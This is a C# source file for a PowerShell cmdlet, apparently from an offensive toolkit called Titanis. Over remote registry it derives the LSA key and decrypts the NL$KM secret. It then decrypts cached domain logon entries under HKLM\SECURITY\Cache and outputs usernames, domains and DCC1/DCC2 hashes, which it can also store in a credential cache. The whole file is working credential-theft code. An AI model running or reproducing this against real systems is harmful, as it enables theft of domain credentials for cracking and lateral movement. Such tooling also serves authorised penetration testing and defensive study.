using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Management.Automation;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Titanis;
using Titanis.Msrpc.Msrrp;

namespace Titanis.Tbo.Smb2.PowerShell
{
	public sealed class TboRegCachedCredentialInfo
	{
		public string ServerName { get; init; } = string.Empty;
		public string Name { get; init; } = string.Empty;
		public string KeyPath { get; init; } = string.Empty;
		public int IterationCount { get; init; }
		public int CacheVersion { get; init; }
		public string? UserName { get; init; }
		public string? DomainName { get; init; }
		public string? DnsDomainName { get; init; }
		public byte[]? DccHash { get; init; }
		public string? DccHashHex { get; init; }
		public byte[]? EncryptedBytes { get; init; }
		public byte[]? DecryptedBytes { get; init; }
	}

	[Cmdlet(VerbsCommon.Get, "TBORegCachedCredentials")]
	[OutputType(typeof(TboRegCachedCredentialInfo))]
	public sealed class GetTBORegCachedCredentials : TboRegLsaSecretCmdlet
	{
		private const string SecurityCacheKeyPath = @"SECURITY\Cache";

		[Parameter(Position = 1)]
		public string[]? Name { get; set; }

		[Parameter(ValueFromPipelineByPropertyName = true)]
		public byte[]? LsaKeyBytes { get; set; }

		[Parameter(ValueFromPipelineByPropertyName = true)]
		public string? LsaKey { get; set; }

		[Parameter]
		public SwitchParameter Cache { get; set; }

		[Parameter]
		public string? CachePath { get; set; }

		protected override void ProcessRecord(ISmbProviderInfo smb, CancellationToken cancellationToken)
		{
			ExecuteRegistryOperation(smb, cancellationToken, session =>
			{
				var lsaKey = ResolveLsaKey(
					smb,
					session,
					cancellationToken,
					this.LsaKeyBytes,
					this.LsaKey,
					nameof(this.LsaKey),
					out var lsaKeySource);
				if (lsaKey == null || lsaKey.Length == 0)
				{
					this.LogWarning(smb, "Get-TBORegCachedCredentials failed to derive the LSA key.");
					return;
				}

				bool vistaOrLater = IsVistaOrLaterCache(lsaKeySource, null);
				var nlkm = ResolveNlkmSecret(session.Client, lsaKey, vistaOrLater, cancellationToken);
				if (nlkm == null || nlkm.Length == 0)
				{
					this.LogWarning(smb, "Get-TBORegCachedCredentials failed to derive the NL$KM secret.");
					return;
				}

				vistaOrLater = IsVistaOrLaterCache(lsaKeySource, nlkm);
				var cacheVersion = vistaOrLater ? 2 : 1;
				var dccKind = cacheVersion == 2 ? "DCC2" : "DCC1";

				var cacheSpec = new RegistryPathSpec(
					RegistryRootKey.LocalMachine,
					RemoteRegistryClient.GetRootName(RegistryRootKey.LocalMachine),
					SecurityCacheKeyPath);

				using var cacheKey = OpenRegistryKey(session.Client, cacheSpec, RegistryAccessRights.QueryValue, cancellationToken);
				List<RegistryValueInfo> values;
				try
				{
					values = CollectValues(cacheKey, includeData: true, cancellationToken);
				}
				catch (Exception ex)
				{
					this.LogException(smb, "Get-TBORegCachedCredentials failed to enumerate cache values", ex);
					throw;
				}

				var iterationCount = GetIterationCount(values);
				var filters = BuildNameFilters(this.Name);
				foreach (var value in values)
				{
					if (string.IsNullOrWhiteSpace(value.Name))
						continue;
					if (!value.Name.StartsWith("NL$", StringComparison.OrdinalIgnoreCase))
						continue;
					if (value.Name.Equals("NL$Control", StringComparison.OrdinalIgnoreCase))
						continue;
					if (!MatchesAny(filters, value.Name))
						continue;

					var cacheBytes = ExtractValueBytes(value);
					if (cacheBytes == null || cacheBytes.Length == 0)
						continue;

					if (!TryParseCacheEntry(cacheBytes, vistaOrLater, nlkm, out var entry))
						continue;

					var info = new TboRegCachedCredentialInfo
					{
						ServerName = this.ServerName,
						Name = value.Name,
						KeyPath = $"HKEY_LOCAL_MACHINE\\{SecurityCacheKeyPath}\\{value.Name}",
						IterationCount = iterationCount,
						CacheVersion = cacheVersion,
						UserName = entry.UserName,
						DomainName = entry.DomainName,
						DnsDomainName = entry.DnsDomainName,
						DccHash = entry.Hash,
						DccHashHex = entry.Hash?.ToHexString(),
						EncryptedBytes = cacheBytes,
						DecryptedBytes = entry.DecryptedBytes
					};

					if (this.Cache.IsPresent && !string.IsNullOrWhiteSpace(info.DccHashHex))
					{
						try
						{
							var contextJson = $"{{\"cacheValue\":\"{value.Name}\",\"iterationCount\":{iterationCount.ToString(CultureInfo.InvariantCulture)},\"cacheVersion\":{cacheVersion.ToString(CultureInfo.InvariantCulture)}}}";
							TboCacheIngestion.AddObservation(new TboCacheIngestion.AddObservationArgs
							{
								ServerName = this.ServerName,
								SourceKind = "Get-TBORegCachedCredentials",
								SourcePath = info.KeyPath,

								PrincipalDomain = entry.DomainName,
								PrincipalName = entry.UserName,
								PrincipalType = "DomainUser",

								CredentialKind = dccKind,
								CredentialIdentifier = info.DccHashHex,

								Confidence = 100,
								ContextJson = contextJson,
								CachePath = this.CachePath
							}, msg => LogDiagnostic(smb, msg));
						}
						catch (Exception ex)
						{
							this.LogException(smb, $"Get-TBORegCachedCredentials failed to write cache observation for {this.ServerName}", ex);
							this.LogWarning(smb, $"Get-TBORegCachedCredentials cache write failed: {ex.Message}");
						}
					}

					this.WriteObject(info);
				}
			});
		}

		private static bool IsVistaOrLaterCache(string? lsaKeySource, byte[]? nlkm)
		{
			if (!string.IsNullOrWhiteSpace(lsaKeySource)
				&& lsaKeySource.EndsWith("PolEKList", StringComparison.OrdinalIgnoreCase))
				return true;

			return nlkm != null && nlkm.Length >= 32;
		}

		private byte[]? ResolveNlkmSecret(
			IRegistryClient client,
			byte[] lsaKey,
			bool vistaOrLater,
			CancellationToken cancellationToken)
		{
			DateTime? lastWriteTime;
			var encrypted = TryReadSecretValue(client, "NL$KM", "CurrVal", cancellationToken, out lastWriteTime);
			if (encrypted == null || encrypted.Length == 0)
				return null;

			var decrypted = DecryptLsaSecret(encrypted, lsaKey);
			if (decrypted == null || decrypted.Length == 0)
				return null;

			if (!vistaOrLater && decrypted.Length >= 64)
				vistaOrLater = true;

			if (vistaOrLater)
				return decrypted;

			return TryExtractSecretPayload(decrypted, out var payload) ? payload : decrypted;
		}

		private static int GetIterationCount(IEnumerable<RegistryValueInfo> values)
		{
			const int defaultIterations = 10240;
			foreach (var value in values)
			{
				if (!string.Equals(value.Name, "NL$Control", StringComparison.OrdinalIgnoreCase))
					continue;

				var bytes = ExtractValueBytes(value);
				if (bytes == null || bytes.Length < 20)
					return defaultIterations;

				var raw = BitConverter.ToUInt32(bytes, 16);
				if (raw > defaultIterations)
					raw &= 0xFFFF;
				return (int)raw;
			}

			return defaultIterations;
		}

		private readonly struct CacheEntry
		{
			public CacheEntry(string? userName, string? domainName, string? dnsDomainName, byte[]? hash, byte[]? decryptedBytes)
			{
				UserName = userName;
				DomainName = domainName;
				DnsDomainName = dnsDomainName;
				Hash = hash;
				DecryptedBytes = decryptedBytes;
			}

			public string? UserName { get; }
			public string? DomainName { get; }
			public string? DnsDomainName { get; }
			public byte[]? Hash { get; }
			public byte[]? DecryptedBytes { get; }
		}

		private static bool TryParseCacheEntry(byte[] cacheBytes, bool vistaOrLater, byte[] nlkm, out CacheEntry entry)
		{
			entry = default;
			if (cacheBytes.Length < 96)
				return false;

			ushort userNameLength = BitConverter.ToUInt16(cacheBytes, 0);
			ushort domainLength = BitConverter.ToUInt16(cacheBytes, 2);
			ushort dnsDomainLength = cacheBytes.Length >= 62 ? BitConverter.ToUInt16(cacheBytes, 60) : (ushort)0;

			byte[] ch = cacheBytes.AsSpan(64, 16).ToArray();
			if (IsZeroBlock(ch))
				return false;

			var encryptedData = cacheBytes.AsSpan(96).ToArray();
			if (encryptedData.Length == 0)
				return false;

			byte[]? decryptedData = vistaOrLater
				? DecryptCacheDataAes(nlkm, ch, encryptedData)
				: DecryptCacheDataRc4(nlkm, ch, encryptedData);
			if (decryptedData == null || decryptedData.Length < 0x10)
				return false;

			var hash = decryptedData.AsSpan(0, 16).ToArray();
			if (!TryReadCachedString(decryptedData, 72, userNameLength, out var userName))
				userName = null;

			int domainOffset = 72 + userNameLength + GetAlignmentPadding(userNameLength);
			if (!TryReadCachedString(decryptedData, domainOffset, domainLength, out var domain))
				domain = null;

			int dnsOffset = domainOffset + domainLength + GetAlignmentPadding(domainLength);
			if (!TryReadCachedString(decryptedData, dnsOffset, dnsDomainLength, out var dnsDomain))
				dnsDomain = null;

			entry = new CacheEntry(userName, domain, dnsDomain, hash, decryptedData);
			return true;
		}

		private static byte[]? DecryptCacheDataRc4(byte[] nlkm, byte[] ch, byte[] encryptedData)
		{
			using var hmac = new HMACMD5(nlkm);
			var rc4Key = hmac.ComputeHash(ch);
			return Rc4Transform(rc4Key, encryptedData);
		}

		private static byte[]? DecryptCacheDataAes(byte[] nlkm, byte[] ch, byte[] encryptedData)
		{
			if (nlkm.Length < 32)
				return null;

			var key = nlkm.AsSpan(16, 16).ToArray();
			var padded = PadToBlock(encryptedData, 16);

			using var aes = Aes.Create();
			aes.Mode = CipherMode.CBC;
			aes.Padding = PaddingMode.None;
			aes.Key = key;
			aes.IV = ch;

			using var decryptor = aes.CreateDecryptor(aes.Key, aes.IV);
			return decryptor.TransformFinalBlock(padded, 0, padded.Length);
		}

		private static byte[] PadToBlock(byte[] data, int blockSize)
		{
			if (data.Length == 0)
				return data;
			int remainder = data.Length % blockSize;
			if (remainder == 0)
				return data;

			var padded = new byte[data.Length + (blockSize - remainder)];
			Buffer.BlockCopy(data, 0, padded, 0, data.Length);
			return padded;
		}

		private static int GetAlignmentPadding(int lengthBytes)
		{
			int chars = lengthBytes / 2;
			return 2 * (chars % 2);
		}

		private static bool TryReadCachedString(byte[] data, int offset, int length, out string? value)
		{
			value = null;
			if (length <= 0)
				return false;
			if (offset < 0 || offset + length > data.Length)
				return false;

			try
			{
				value = Encoding.Unicode.GetString(data, offset, length).TrimEnd('\0');
				return true;
			}
			catch
			{
				return false;
			}
		}

		private static bool IsZeroBlock(byte[] data)
		{
			foreach (var b in data)
			{
				if (b != 0)
					return false;
			}

			return true;
		}

		private static void LogDiagnostic(ISmbProviderInfo smb, string message)
		{
			if (smb is SmbProviderInfo provider)
				provider.LogDiagnostic(message);
		}

	}
}
